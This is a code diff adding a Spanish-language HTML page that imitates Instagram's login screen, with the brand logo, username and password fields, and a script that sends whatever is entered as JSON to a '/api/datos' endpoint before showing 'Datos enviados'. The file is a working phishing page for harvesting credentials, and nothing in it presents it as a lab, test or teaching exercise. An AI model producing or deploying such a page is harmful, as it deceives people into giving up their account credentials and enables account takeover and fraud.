@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Iniciar sesión</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://marketing4ecommerce.mx/wp-content/uploads/2014/06/Instagram-Logook.png" alt="Instagram" class="logo"> 
+        <form class="login-form" id="form">
+            <input type="text" name="user" placeholder="Teléfono, usuario o correo electrónico" required>
+            <input type="password" name="pass" placeholder="Contraseña" required>
+            <button type="submit" id="btn">Iniciar sesión</button>
+        </form>
+        <p class="forgot-password"><a href="#">¿Olvidaste tu contraseña?</a></p>
+    </div>
+    <script>
+        const form = document.getElementById("form");
+        form.addEventListener("submit", async (e) => {
+            e.preventDefault();
+        const formData = new FormData(form);
+        const data = {
+            user: formData.get("user"),
+            pass: formData.get("pass")
+            };
+
+        await fetch("/api/datos", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        });
+
+        alert("Datos enviados");
+        form.reset();
+    });
+    </script>
+</body>
+</html>
